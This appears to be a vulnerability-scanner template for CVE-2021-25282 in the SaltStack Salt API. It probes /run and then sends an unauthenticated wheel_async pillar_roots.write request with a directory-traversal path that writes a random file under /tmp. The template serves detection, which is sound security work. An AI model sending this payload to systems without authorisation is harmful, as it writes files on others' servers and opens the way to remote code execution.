name: yaml-poc-fedoraproject-fedora-directory_traversal-CVE-2021-25282
binding: 9f266abc-f896-443f-bcc9-59890c44fd0f
detail:
    author: system_user
    links:
        - http://packetstormsecurity.com/files/162058/SaltStack-Salt-API-Unauthenticated-Remote-Command-Execution.html
        - https://github.com/saltstack/salt/releases
        - https://lists.debian.org/debian-lts-announce/2021/11/msg00009.html
        - https://lists.debian.org/debian-lts-announce/2022/01/msg00000.html
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/7GRVZ5WAEI3XFN2BDTL6DDXFS5HYSDVB/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/FUGLOJ6NXLCIFRD2JTXBYQEMAEF2B6XH/
        - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/YOGNT2XWPOYV7YT75DN7PS4GIYWFKOK5/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7GRVZ5WAEI3XFN2BDTL6DDXFS5HYSDVB/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/FUGLOJ6NXLCIFRD2JTXBYQEMAEF2B6XH/
        - https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/YOGNT2XWPOYV7YT75DN7PS4GIYWFKOK5/
        - https://nvd.nist.gov/vuln/detail/CVE-2021-25282
        - https://packetstormsecurity.com/files/162038/Gentoo-Linux-Security-Advisory-202103-01.html
        - https://packetstormsecurity.com/files/162058/SaltStack-Salt-API-Unauthenticated-Remote-Command-Execution.html
        - https://saltproject.io/security_announcements/active-saltstack-cve-release-2021-feb-25/
        - https://security.gentoo.org/glsa/202103-01
        - https://security.gentoo.org/glsa/202310-22
        - https://vigilance.fr/vulnerability/SaltStack-multiple-vulnerabilities-34704
        - https://www.auscert.org.au/bulletins/ESB-2021.0727
        - https://www.auscert.org.au/bulletins/ESB-2021.0740
        - https://www.auscert.org.au/bulletins/ESB-2021.0975
        - https://www.auscert.org.au/bulletins/ESB-2021.0976
        - https://www.auscert.org.au/bulletins/ESB-2021.1788
        - https://www.auscert.org.au/bulletins/ESB-2021.3835
        - https://www.auscert.org.au/bulletins/ESB-2021.3958
        - https://www.auscert.org.au/bulletins/ESB-2022.0046
        - https://www.cybersecurity-help.cz/vdb/SB2021112302
        - https://www.debian.org/security/2021/dsa-5011
    vulnerability:
        id: fb793e20-8663-4017-8ce6-4c2589ea336c
        level: critical
    warning: Dirty Data
transport: http
set:
    r1: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /run
            follow_redirects: false
        expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"wheel_async") && response.body.bcontains(b"runner_async")
    r1:
        request:
            cache: true
            method: POST
            path: /run
            headers:
                Content-Type: application/json
            body: '{"eauth":"auto","client":"wheel_async","fun":"pillar_roots.write","data":"{{r1}}","path":"../../../../../../../../../tmp/{{r1}}"}'
            follow_redirects: false
        expression: response.status == 200 && response.content_type.icontains("application/json") && "salt/wheel/d*".bmatches(response.body)
expression: r0() && r1()
